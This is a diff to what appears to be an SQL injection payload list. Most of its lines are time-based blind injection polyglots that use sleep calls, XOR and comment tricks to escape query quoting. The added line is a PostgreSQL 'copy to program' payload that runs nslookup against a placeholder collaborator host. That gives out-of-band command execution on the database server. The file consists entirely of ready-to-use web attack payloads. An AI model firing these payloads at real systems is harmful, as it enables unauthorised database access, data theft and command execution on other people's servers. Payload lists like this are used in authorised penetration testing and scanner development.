@@ -1,4 +1,5 @@
 XOR(if(now()=sysdate(),sleep(5),0))XOR
+copy (SELECT '') to program 'nslookup COLLABORATOR-HERE'
 &1/*'/*"/**/||1#\
 and-1/*'/*"/**/||1--\
 SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
